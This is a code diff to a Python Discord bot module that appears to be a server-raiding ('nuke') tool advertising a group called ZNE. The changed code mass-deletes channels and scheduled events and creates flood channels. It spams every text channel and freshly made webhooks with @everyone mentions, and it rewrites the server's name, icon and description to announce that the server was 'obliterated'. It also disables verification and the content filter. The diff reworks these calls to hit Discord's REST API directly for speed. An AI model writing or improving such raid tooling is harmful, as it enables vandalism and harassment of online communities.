@@ -4,14 +4,17 @@ import os
 import logging
 import random
 from typing import Optional
+from urllib.parse import quote
 
 import aiohttp
 import discord
 from aiolimiter import AsyncLimiter
-from discord import utils
 
 from .settings import Settings, State, MISSING, now as utils_now
 from .ratelimit import limiter
+
+
+API = "https://discord.com/api/v10"
 
 
 class Operations:
@@ -21,6 +24,8 @@ class Operations:
         self.session: Optional[aiohttp.ClientSession] = None
         self.limiter: Optional[AsyncLimiter] = None
         self.http_limiter: Optional[limiter] = None
+        self.token: str = ""
+        self.bot_id: str = ""
 
     async def setup(self):
         if not hasattr(self.bot.http, "fast_limiter"):
@@ -29,6 +34,8 @@ class Operations:
         self.session = aiohttp.ClientSession()
         rps = max(1, self.settings.requests_per_second)
         self.limiter = AsyncLimiter(rps, 1)
+        self.token = self.bot.http.token
+        self.bot_id = str(self.bot.user.id)
 
     async def close(self):
         if self.session and not self.session.closed:
@@ -36,9 +43,15 @@ class Operations:
         if self.http_limiter:
             await self.http_limiter.close()
 
-    async def _req(self, method: str, url: str, **kwargs):
+    def _auth(self) -> dict:
+        return {"Authorization": f"Bot {self.token}"}
+
+    async def _req(self, method: str, route: str, url: str, **kwargs):
+        headers = kwargs.pop("headers", {}) or {}
+        headers.update(self._auth())
+        kwargs["headers"] = headers
         async with self.limiter:
-            return await self.session.request(method, url, **kwargs)
+            return await self.http_limiter.request(method, route, url, **kwargs)
 
     def _pick_name(self) -> str:
         names = self.settings.channel_names
@@ -46,29 +59,46 @@ class Operations:
 
     async def CrChannel(self, guild: discord.Guild) -> int:
         count = self.settings.channel_count
+        names_pool = self.settings.channel_names or ["fluked"]
         tasks = []
         for i in range(count):
-            name = f"{self._pick_name()}-{i}" if count > len(self.settings.channel_names) else self._pick_name()
-            tasks.append(asyncio.create_task(self._create_channel(guild, name)))
+            base = names_pool[i % len(names_pool)]
+            name = f"{base}-{i}" if count > len(names_pool) else base
+            tasks.append(asyncio.create_task(self._create_channel(guild.id, name)))
         results = await asyncio.gather(*tasks, return_exceptions=True)
         return sum(1 for r in results if not isinstance(r, Exception) and r is not None)
 
-    async def _create_channel(self, guild: discord.Guild, name: str):
+    async def _create_channel(self, guild_id: int, name: str) -> bool:
+        url = f"{API}/guilds/{guild_id}/channels"
+        route = f"guilds:{guild_id}:channels"
+        payload = {"name": name, "type": 0}
         try:
-            return await guild.create_text_channel(name=name)
-        except (discord.Forbidden, discord.HTTPException):
-            return None
+            res = await self._req("POST", route, url, json=payload)
+            try:
+                await res.read()
+            finally:
+                res.release()
+            return res.status in (200, 201)
+        except Exception:
+            return False
 
     async def DelChannels(self, guild: discord.Guild) -> int:
         channels = list(guild.channels)
-        tasks = [asyncio.create_task(self._delete_channel(c)) for c in channels]
+        tasks = [asyncio.create_task(self._delete_channel(c.id, c.__class__.__name__.lower())) for c in channels]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         return sum(1 for r in results if not isinstance(r, Exception) and r)
 
-    async def _delete_channel(self, channel: discord.abc.GuildChannel) -> bool:
+    async def _delete_channel(self, channel_id: int, _kind: str) -> bool:
+        url = f"{API}/channels/{channel_id}"
+        route = f"channels:{channel_id}"
         try:
-            return await channel.delete()
-        except (discord.Forbidden, discord.HTTPException, AttributeError):
+            res = await self._req("DELETE", route, url)
+            try:
+                await res.read()
+            finally:
+                res.release()
+            return 200 <= res.status < 300
+        except Exception:
             return False
 
     async def spam(self, guild: discord.Guild) -> int:
@@ -78,20 +108,28 @@ class Operations:
         tasks = []
         for _ in range(self.settings.spam_count):
             for channel in text_channels:
-                tasks.append(asyncio.create_task(self._send_spam(channel)))
+                tasks.append(asyncio.create_task(self._send_spam(channel.id, guild.id)))
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        return sum(1 for r in results if not isinstance(r, Exception) and r is not None)
+        return sum(1 for r in results if not isinstance(r, Exception) and r)
 
-    async def _send_spam(self, channel: discord.TextChannel):
+    async def _send_spam(self, channel_id: int, guild_id: int):
+        url = f"{API}/channels/{channel_id}/messages"
+        route = f"channels:{channel_id}:messages"
+        payload = {"content": self.settings.spam_message, "allowed_mentions": {"parse": ["users", "roles", "everyone"]}, "tts": False}
         try:
-            return await channel.send(self.settings.spam_message)
-        except (discord.Forbidden, discord.HTTPException):
+            res = await self._req("POST", route, url, json=payload)
+            try:
+                await res.read()
+            finally:
+                res.release()
+            return res.status in (200, 201)
+        except Exception:
             return None
 
     async def mess_server(self, guild: discord.Guild) -> None:
         settings = self.settings
-        server_banner = MISSING
-        server_splash = MISSING
+        server_banner = None
+        server_splash = None
         server_icon = None
         icon_path = "assets/zne.png"
         banner_path = "assets/zne_banner.png"
@@ -105,50 +143,91 @@ class Operations:
                 server_splash = file.read()
             server_banner = server_splash
 
-        for event in list(guild.scheduled_events):
-            asyncio.create_task(self._safe(event.delete))
+        asyncio.create_task(self._delete_scheduled_events(guild.id))
 
-        event_kwargs = dict(
-            name=State.get_phrase(),
-            start_time=utils_now(seconds=3),
-            end_time=utils_now().replace(year=2029),
-            entity_type=discord.EntityType.external,
-            privacy_level=discord.PrivacyLevel.guild_only,
-            location="https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip",
-            description="Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
-        )
-        if server_banner is not MISSING:
+        event_kwargs = {
+            "name": State.get_phrase(),
+            "privacy_level": 2,
+            "entity_type": 3,
+            "scheduled_start_time": utils_now(seconds=3).isoformat(),
+            "scheduled_end_time": utils_now().replace(year=2029).isoformat(),
+            "description": "Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
+            "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip"},
+        }
+        if server_banner is not None:
             event_kwargs["image"] = server_banner
+        asyncio.create_task(self._create_scheduled_event(guild.id, event_kwargs))
 
-        asyncio.create_task(
-            guild.create_scheduled_event(**event_kwargs)
-        )
+        edit_payload = {
+            "name": settings.server_name,
+            "description": "This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
+            "default_notifications": 1,
+            "verification_level": 0,
+            "explicit_content_filter": 0,
+            "premium_progress_bar_enabled": True,
+        }
+        if server_icon:
+            edit_payload["icon"] = server_icon
+        if server_splash is not None:
+            edit_payload["splash"] = server_splash
+        if server_banner is not None:
+            edit_payload["banner"] = server_banner
 
+        url = f"{API}/guilds/{guild.id}"
+        route = f"guilds:{guild.id}"
         try:
-            kwargs = dict(
-                name=settings.server_name,
-                description="This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
-                community=False,
-                default_notifications=discord.NotificationLevel.all_messages,
-                discoverable=False,
-                widget_enabled=False,
-                dms_disabled_until=utils_now(days=1),
-                invites_disabled_until=utils_now(days=1),
-                premium_progress_bar_enabled=True,
-                verification_level=discord.VerificationLevel.none,
-                explicit_content_filter=discord.ContentFilter.disabled,
-            )
-            if server_icon:
-                kwargs["icon"] = server_icon
-            if server_splash is not MISSING:
-                kwargs["splash"] = server_splash
-            if server_banner is not MISSING:
-                kwargs["banner"] = server_banner
-            await guild.edit(**kwargs)
-        except discord.Forbidden:
-            return
-        except discord.HTTPException:
-            return
+            res = await self._req("PATCH", route, url, json=edit_payload)
+            try:
+                await res.read()
+            finally:
+                res.release()
+        except Exception:
+            pass
+
+    async def _delete_scheduled_events(self, guild_id: int):
+        url = f"{API}/guilds/{guild_id}/scheduled-events"
+        route = f"guilds:{guild_id}:scheduled-events"
+        try:
+            res = await self._req("GET", route, url)
+            if res.status != 200:
+                try:
+                    await res.read()
+                finally:
+                    res.release()
+                return
+            data = await res.json()
+            res.release()
+            for ev in data:
+                eid = ev.get("id")
+                if not eid:
+                    continue
+                asyncio.create_task(self._safe_delete_event(guild_id, eid))
+        except Exception:
+            pass
+
+    async def _safe_delete_event(self, guild_id: int, event_id: str):
+        url = f"{API}/guilds/{guild_id}/scheduled-events/{event_id}"
+        route = f"guilds:{guild_id}:scheduled-events:{event_id}"
+        try:
+            res = await self._req("DELETE", route, url)
+            try:
+                await res.read()
+            finally:
+                res.release()
+        except Exception:
+            pass
+
+    async def _create_scheduled_event(self, guild_id: int, payload: dict):
+        url = f"{API}/guilds/{guild_id}/scheduled-events"
+        route = f"guilds:{guild_id}:scheduled-events"
+        try:
+            res = await self._req("POST", route, url, json=payload)
+            try:
+                await res.read()
+            finally:
+                res.release()
+        except Exception:
+            pass
 
     async def _safe(self, coro):
         try:
@@ -161,34 +240,51 @@ class Operations:
         if not text_channels:
             return 0
 
-        webhook_tasks = [asyncio.create_task(self._create_webhook(c)) for c in text_channels]
-        webhooks = await asyncio.gather(*webhook_tasks, return_exceptions=True)
-        valid = [w for w in webhooks if not isinstance(w, Exception) and w is not None]
-
+        webhook_ids = await asyncio.gather(*[self._create_webhook(c.id) for c in text_channels])
+        valid = [w for w in webhook_ids if w]
         if not valid:
             return 0
 
         send_tasks = []
         for _ in range(self.settings.webhook_count):
-            for wh in valid:
-                send_tasks.append(asyncio.create_task(self._send_webhook(wh)))
+            for wid, wtoken in valid:
+                send_tasks.append(asyncio.create_task(self._send_webhook(wid, wtoken)))
 
         results = await asyncio.gather(*send_tasks, return_exceptions=True)
-        return sum(1 for r in results if not isinstance(r, Exception) and r is not None)
+        return sum(1 for r in results if not isinstance(r, Exception) and r)
 
-    async def _create_webhook(self, channel: discord.TextChannel):
+    async def _create_webhook(self, channel_id: int):
+        url = f"{API}/channels/{channel_id}/webhooks"
+        route = f"channels:{channel_id}:webhooks"
+        payload = {"name": self.settings.webhook_name}
         try:
-            return await channel.create_webhook(name=self.settings.webhook_name)
-        except (discord.Forbidden, discord.HTTPException):
+            res = await self._req("POST", route, url, json=payload)
+            if res.status in (200, 201):
+                data = await res.json()
+                res.release()
+                return (data.get("id"), data.get("token"))
+            try:
+                await res.read()
+            finally:
+                res.release()
+        except Exception:
             return None
+        return None
 
-    async def _send_webhook(self, webhook: discord.Webhook) -> bool:
+    async def _send_webhook(self, webhook_id: str, webhook_token: str) -> bool:
+        url = f"{API}/webhooks/{webhook_id}/{webhook_token}"
+        route = f"webhooks:{webhook_id}:send"
+        payload = {
+            "content": self.settings.webhook_message,
+            "username": self.settings.webhook_name,
+            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
+        }
         try:
-            await webhook.send(
-                self.settings.webhook_message,
-                username=self.settings.webhook_name,
-                wait=False,
-            )
-            return True
-        except (discord.HTTPException, discord.NotFound):
+            res = await self._req("POST", route, url, json=payload)
+            try:
+                await res.read()
+            finally:
+                res.release()
+            return 200 <= res.status < 300
+        except Exception:
             return False
